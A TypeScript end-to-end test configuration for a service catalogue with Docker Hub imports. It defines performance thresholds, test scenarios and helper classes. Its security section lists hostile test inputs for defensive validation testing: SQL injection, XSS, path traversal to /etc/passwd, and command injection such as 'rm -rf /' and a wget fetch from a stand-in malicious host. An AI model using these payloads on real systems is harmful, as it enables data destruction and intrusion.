/**
 * End-to-End Test Configuration
 * 
 * Configures test environments, performance thresholds, and test scenarios
 * for comprehensive E2E testing of service discovery and contribution flows.
 */

export interface E2ETestConfig {
  performance: {
    maxResponseTime: number
    maxConcurrentRequests: number
    maxBulkOperationSize: number
    paginationStressSize: number
  }
  security: {
    maxInputLength: {
      name: number
      description: number
      url: number
    }
    rateLimits: {
      requestsPerMinute: number
      burstLimit: number
    }
    maliciousPatterns: string[]
  }
  database: {
    cleanupTimeout: number
    transactionTimeout: number
    maxConnections: number
  }
  scenarios: {
    serviceDiscovery: TestScenario[]
    contributionFlows: TestScenario[]
    adminWorkflows: TestScenario[]
  }
}

export interface TestScenario {
  name: string
  description: string
  steps: TestStep[]
  expectedOutcome: string
  performance?: {
    maxDuration: number
    maxMemoryUsage?: number
  }
}

export interface TestStep {
  action: string
  params: Record<string, any>
  assertions: string[]
  performance?: {
    maxResponseTime: number
  }
}

/**
 * Default E2E test configuration
 */
export const defaultE2EConfig: E2ETestConfig = {
  performance: {
    maxResponseTime: 500, // Must be under 500ms per technical spec
    maxConcurrentRequests: 50,
    maxBulkOperationSize: 100,
    paginationStressSize: 100
  },
  
  security: {
    maxInputLength: {
      name: 100,
      description: 1000,
      url: 500
    },
    rateLimits: {
      requestsPerMinute: 100,
      burstLimit: 20
    },
    maliciousPatterns: [
      // SQL injection patterns
      "'; DROP TABLE services; --",
      "1' OR '1'='1",
      "admin'--",
      "1' UNION SELECT * FROM services--",
      "'; DELETE FROM categories; --",
      "1' OR 1=1 /*",
      
      // XSS patterns
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert(1)',
      
      // Path traversal patterns
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\',
      'file:///etc/passwd',
      
      // Command injection patterns
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& wget malicious-site.com/payload',
    ]
  },
  
  database: {
    cleanupTimeout: 10000, // 10 seconds
    transactionTimeout: 30000, // 30 seconds
    maxConnections: 10
  },
  
  scenarios: {
    serviceDiscovery: [
      {
        name: 'Basic Service Discovery Flow',
        description: 'User discovers services through browsing and filtering',
        steps: [
          {
            action: 'list_categories',
            params: { limit: 10 },
            assertions: ['response.categories.length > 0', 'response_time < 500'],
            performance: { maxResponseTime: 300 }
          },
          {
            action: 'list_services',
            params: { limit: 20, categoryId: 1 },
            assertions: ['response.services.length <= 20', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          },
          {
            action: 'search_services',
            params: { search: 'database', limit: 10 },
            assertions: ['response.services.length >= 0', 'response_time < 500'],
            performance: { maxResponseTime: 450 }
          },
          {
            action: 'get_service_details',
            params: { id: 1 },
            assertions: ['response.service.id === 1', 'response_time < 500'],
            performance: { maxResponseTime: 200 }
          }
        ],
        expectedOutcome: 'User successfully discovers and views service details',
        performance: {
          maxDuration: 2000 // Total scenario under 2 seconds
        }
      },
      
      {
        name: 'Advanced Filtering and Pagination',
        description: 'User uses advanced filters and navigates through paginated results',
        steps: [
          {
            action: 'list_services_with_filters',
            params: { 
              categoryId: 1,
              search: 'web',
              limit: 10,
              sortBy: 'name',
              sortOrder: 'asc'
            },
            assertions: ['response.services.length <= 10', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          },
          {
            action: 'paginate_results',
            params: { 
              categoryId: 1,
              limit: 10,
              cursor: 10
            },
            assertions: ['response.services.length <= 10', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          }
        ],
        expectedOutcome: 'User successfully filters and paginates through service results',
        performance: {
          maxDuration: 1500
        }
      }
    ],
    
    contributionFlows: [
      {
        name: 'External Docker Hub Import',
        description: 'User imports a service from Docker Hub',
        steps: [
          {
            action: 'submit_docker_import',
            params: {
              sourceUrl: 'https://hub.docker.com/r/nginx/nginx',
              categoryId: 1,
              submittedBy: 'user-123'
            },
            assertions: ['response.import.status === "pending"', 'response_time < 1000'],
            performance: { maxResponseTime: 800 }
          },
          {
            action: 'check_import_status',
            params: { importId: 'created_import_id' },
            assertions: ['response.import.status !== "error"', 'response_time < 500'],
            performance: { maxResponseTime: 300 }
          }
        ],
        expectedOutcome: 'Import submitted successfully and pending admin review',
        performance: {
          maxDuration: 2000
        }
      },
      
      {
        name: 'Manual Service Contribution',
        description: 'User manually creates a new service contribution',
        steps: [
          {
            action: 'create_service',
            params: {
              name: 'My Custom Service',
              description: 'A custom service I created',
              dockerImage: 'myuser/custom-service:latest',
              version: '1.0.0',
              categoryId: 1
            },
            assertions: ['response.service.status === "pending"', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          },
          {
            action: 'add_service_configuration',
            params: {
              serviceId: 'created_service_id',
              ports: [{ containerPort: 8080, hostPort: 8080 }],
              environmentVariables: [{ name: 'NODE_ENV', defaultValue: 'production' }]
            },
            assertions: ['response.success === true', 'response_time < 500'],
            performance: { maxResponseTime: 300 }
          }
        ],
        expectedOutcome: 'Service created successfully and pending admin approval',
        performance: {
          maxDuration: 1500
        }
      }
    ],
    
    adminWorkflows: [
      {
        name: 'Import Review and Approval',
        description: 'Admin reviews and approves pending imports',
        steps: [
          {
            action: 'get_admin_dashboard',
            params: {},
            assertions: ['response.pendingImports >= 0', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          },
          {
            action: 'list_pending_imports',
            params: { limit: 20, status: 'pending' },
            assertions: ['response.imports.length >= 0', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          },
          {
            action: 'review_import',
            params: {
              importId: 1,
              action: 'approve',
              reviewNotes: 'Service looks good, approved'
            },
            assertions: ['response.import.status === "approved"', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          }
        ],
        expectedOutcome: 'Import successfully reviewed and approved',
        performance: {
          maxDuration: 2000
        }
      },
      
      {
        name: 'Bulk Operations',
        description: 'Admin performs bulk operations on multiple services',
        steps: [
          {
            action: 'bulk_review_imports',
            params: {
              importIds: [1, 2, 3, 4, 5],
              action: 'approve',
              reviewNotes: 'Bulk approval of vetted services'
            },
            assertions: ['response.processed === 5', 'response_time < 1000'],
            performance: { maxResponseTime: 800 }
          },
          {
            action: 'bulk_update_service_status',
            params: {
              serviceIds: [1, 2, 3],
              status: 'featured'
            },
            assertions: ['response.updated === 3', 'response_time < 500'],
            performance: { maxResponseTime: 400 }
          }
        ],
        expectedOutcome: 'Bulk operations completed successfully',
        performance: {
          maxDuration: 2000
        }
      }
    ]
  }
}

/**
 * Environment-specific configurations
 */
export const environmentConfigs = {
  test: {
    ...defaultE2EConfig,
    performance: {
      ...defaultE2EConfig.performance,
      maxResponseTime: 1000, // More lenient for testing
    },
    database: {
      ...defaultE2EConfig.database,
      cleanupTimeout: 5000,
    }
  },
  
  ci: {
    ...defaultE2EConfig,
    performance: {
      ...defaultE2EConfig.performance,
      maxResponseTime: 2000, // CI environments can be slower
      maxConcurrentRequests: 20, // Lower concurrency in CI
    }
  },
  
  production: {
    ...defaultE2EConfig,
    // Production config uses strict defaults
  }
}

/**
 * Get configuration for current environment
 */
export function getE2EConfig(): E2ETestConfig {
  const env = process.env.NODE_ENV || 'test'
  
  switch (env as 'test' | 'development' | 'production' | 'ci') {
    case 'test':
      return environmentConfigs.test
    case 'ci':
      return environmentConfigs.ci
    case 'production':
      return environmentConfigs.production
    case 'development':
      return environmentConfigs.test // Use test config for development
    default:
      return defaultE2EConfig
  }
}

/**
 * Performance assertion helpers
 */
export class PerformanceAssertions {
  private config: E2ETestConfig
  
  constructor(config: E2ETestConfig = getE2EConfig()) {
    this.config = config
  }
  
  assertResponseTime(actualTime: number, operation: string): void {
    const maxTime = this.config.performance.maxResponseTime
    if (actualTime > maxTime) {
      throw new Error(
        `Performance requirement failed for ${operation}: ` +
        `${actualTime}ms > ${maxTime}ms maximum`
      )
    }
  }
  
  assertConcurrentPerformance(totalTime: number, requestCount: number): void {
    const averageTime = totalTime / requestCount
    const maxTime = this.config.performance.maxResponseTime
    
    if (averageTime > maxTime) {
      throw new Error(
        `Concurrent performance requirement failed: ` +
        `average ${averageTime}ms > ${maxTime}ms maximum`
      )
    }
  }
  
  assertInputLength(input: string, field: keyof typeof defaultE2EConfig.security.maxInputLength): void {
    const maxLength = this.config.security.maxInputLength[field]
    if (input.length > maxLength) {
      throw new Error(
        `Input length validation failed for ${field}: ` +
        `${input.length} > ${maxLength} maximum characters`
      )
    }
  }
}

/**
 * Security test patterns and utilities
 */
export class SecurityTestUtils {
  private config: E2ETestConfig
  
  constructor(config: E2ETestConfig = getE2EConfig()) {
    this.config = config
  }
  
  getMaliciousPatterns(): string[] {
    return this.config.security.maliciousPatterns
  }
  
  generateOversizedInput(field: keyof typeof defaultE2EConfig.security.maxInputLength): string {
    const maxLength = this.config.security.maxInputLength[field]
    return 'A'.repeat(maxLength + 100) // Exceed limit by 100 characters
  }
  
  isValidDockerImage(image: string): boolean {
    // Basic Docker image format validation
    const dockerImageRegex = /^[a-z0-9]([a-z0-9_.-]*[a-z0-9])?\/[a-z0-9]([a-z0-9_.-]*[a-z0-9])?:[a-z0-9]([a-z0-9_.-]*[a-z0-9])?$/i
    return dockerImageRegex.test(image)
  }
  
  isValidDockerHubUrl(url: string): boolean {
    // Validate Docker Hub URLs
    const dockerHubRegex = /^https:\/\/hub\.docker\.com\/r\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9_-]+$/
    return dockerHubRegex.test(url)
  }
}

/**
 * Test data generators
 */
export class TestDataGenerator {
  static generateService(overrides: Partial<any> = {}) {
    return {
      name: 'Test Service',
      description: 'A test service for E2E testing',
      dockerImage: 'test/service:latest',
      version: '1.0.0',
      status: 'pending',
      ...overrides
    }
  }
  
  static generateCategory(overrides: Partial<any> = {}) {
    return {
      name: 'Test Category',
      slug: 'test-category',
      description: 'A test category for E2E testing',
      sortOrder: 1,
      ...overrides
    }
  }
  
  static generateImport(overrides: Partial<any> = {}) {
    return {
      name: 'Test Import',
      description: 'A test import for E2E testing',
      sourceUrl: 'https://hub.docker.com/r/test/service',
      sourceType: 'docker_hub',
      status: 'pending',
      submittedBy: 'test-user',
      ...overrides
    }
  }
  
  static generateBulkTestData(count: number, generator: Function) {
    return Array.from({ length: count }, (_, i) => 
      generator({ name: `Test Item ${i + 1}`, slug: `test-item-${i + 1}` })
    )
  }
}